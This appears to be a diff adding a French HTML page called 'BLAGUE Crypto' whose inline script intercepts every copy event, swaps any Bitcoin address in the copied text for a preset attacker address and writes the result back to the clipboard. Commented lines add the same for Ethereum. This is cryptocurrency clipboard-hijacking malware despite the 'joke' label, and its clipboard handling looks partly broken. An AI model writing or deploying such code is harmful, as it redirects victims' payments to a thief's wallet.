@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLAGUE Crypto</title>
+    <script>
+        document.addEventListener('copy', function (event) {
+            event.preventDefault();
+            var pastedText = (event.originalEvent || event).clipboardData.getData('text/plain');
+            var modifiedText = replaceCryptoAddresses(pastedText);
+            console.log('Texte collé:', modifiedText);
+            navigator.clipboard.writeText(modifiedText).then(function () {
+                alert('Texte collé et modifié : ' + modifiedText);
+            });
+        });
+
+        function replaceCryptoAddresses(originalText) {
+            // Remplacement des adresses Bitcoin par l'adresse spécifique
+            var btcAddressRegex = /(?:btc:\s*([13][a-zA-Z0-9]{33,44})|btc:\s*([bc][a-zA-Z0-9]{35,}))\b/g;
+            var replacedText = originalText.replace(btcAddressRegex, 'btc: VotreAdresseBTC');
+            // Remplacez 'VotreAdresseBTC' par l'adresse que vous souhaitez prédefinir
+
+            // Ajoutez d'autres remplacements pour d'autres crypto-monnaies ici si nécessaire
+            // var ethAddressRegex = /(?:eth:\s*([a-zA-Z0-9]{42}))\b/g;
+            // replacedText = replacedText.replace(ethAddressRegex, 'eth: VotreAdresseETH');
+            
+            return replacedText;
+        }
+    </script>
+</head>
+
+<body>
+    <!-- Ajoutez du contenu ici si nécessaire -->
+</body>
+
+</html>
